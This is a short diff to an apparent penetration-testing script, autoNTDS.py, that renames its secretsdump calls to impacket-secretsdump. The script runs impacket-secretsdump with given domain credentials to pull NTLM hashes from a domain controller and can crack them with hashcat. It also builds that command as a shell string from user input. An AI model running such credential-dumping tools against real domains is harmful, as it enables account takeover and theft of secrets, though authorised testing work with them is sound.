@@ -3,7 +3,7 @@ import subprocess
 import re
 
 def main():
-    parser = argparse.ArgumentParser(description="Execute secretsdump.py and hashcat with provided parameters.",
+    parser = argparse.ArgumentParser(description="Execute impacket-secretsdump and hashcat with provided parameters.",
                                      epilog="Usage examples:\n"
                                             "  autoNTDS.py --ntds -d domain -u username -p password -ip 192.168.1.1\n"
                                             "  autoNTDS.py --ntds --crack -d domain -u username -p password -ip 192.168.1.1 -w wordlist.txt\n"
@@ -39,12 +39,12 @@ def main():
         return
 
     if args.ntds:
-        cmd = f"secretsdump.py {args.domain}/{args.user}:'{args.password}'@{args.ipaddress} -just-dc-ntlm"
+        cmd = f"impacket-secretsdump {args.domain}/{args.user}:'{args.password}'@{args.ipaddress} -just-dc-ntlm"
         print(f"Executing command: {cmd}")
         
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
         if "SessionError" in result.stdout:
-            print("SessionError encountered during secretsdump execution. Exiting without writing any files.")
+            print("SessionError encountered during impacket-secretsdump execution. Exiting without writing any files.")
             return
 
         lines = result.stdout.split("\n")
